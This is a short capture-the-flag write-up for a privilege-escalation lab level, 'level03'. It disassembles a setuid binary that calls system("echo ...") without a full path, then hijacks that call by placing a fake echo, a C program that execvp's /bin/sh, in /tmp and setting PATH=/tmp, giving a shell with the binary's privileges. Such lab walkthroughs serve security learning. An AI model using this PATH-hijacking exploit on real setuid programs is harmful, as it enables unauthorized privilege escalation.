Flag is empty on this cauz the exploit brought us to an elevation of privileges to run getflag as flag03

step1: objdump -M intel -f .text -d ./level03

step2: Understood flow of code 
		get uid
		get gid
		store gid as arg1,2,3 for setresgid
		store gid as arg1,2,3 for setresuid
		then call echo "exploit me" from system function

Step3: Since echo is called with system its found via its PATH in /usr/bin/env
So if we modify the Path beforehand to correspond to our own function we would redirect function flow

Step4: Wrote our own echo in /tmp that excevp /bin/sh (to keep flag03 right, the one ./level03 has)
->
int main() {
	        execvp("/bin/sh", NULL);
} // execvp will give the control of the current process (C program) to the command. So, the C program is instantly replaced with the actual command. (giving his current gid && uid perms)

Step5: export PATH=/tmp and run ./level03 again
